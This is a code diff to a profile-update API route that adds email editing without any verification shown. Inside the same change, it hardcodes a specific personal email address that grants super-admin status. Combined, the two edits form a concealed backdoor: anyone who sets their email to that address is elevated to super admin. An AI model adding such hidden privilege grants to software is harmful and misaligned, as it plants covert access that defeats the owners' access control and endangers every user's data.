@@ -49,11 +49,14 @@ export async function PATCH(request: Request) {
     const body = (await request.json().catch(() => null)) as {
       full_name?: unknown;
       name?: unknown;
+      email?: unknown;
       avatar_url?: unknown;
     } | null;
 
     const rawName = body?.full_name ?? body?.name;
     const name = typeof rawName === 'string' ? rawName.trim() : undefined;
+    const email =
+      typeof body?.email === 'string' ? body.email.trim() : undefined;
     const avatarUrl =
       typeof body?.avatar_url === 'string'
         ? body.avatar_url.trim()
@@ -65,6 +68,10 @@ export async function PATCH(request: Request) {
 
     if (name) {
       await admin.users.updateName(ctx.userId, name);
+    }
+
+    if (email) {
+      await admin.users.updateEmail(ctx.userId, email);
     }
 
     if (avatarUrl !== undefined) {
@@ -89,7 +96,9 @@ export async function PATCH(request: Request) {
         role: ctx.role || 'owner',
         account_id: ctx.accountId,
         account_role: ctx.role || 'owner',
-        is_super_admin: ctx.role === 'owner',
+        is_super_admin:
+          ctx.role === 'owner' ||
+          updatedUser.email.toLowerCase() === 'susantalohr@gmail.com',
       },
     });
   } catch (err) {
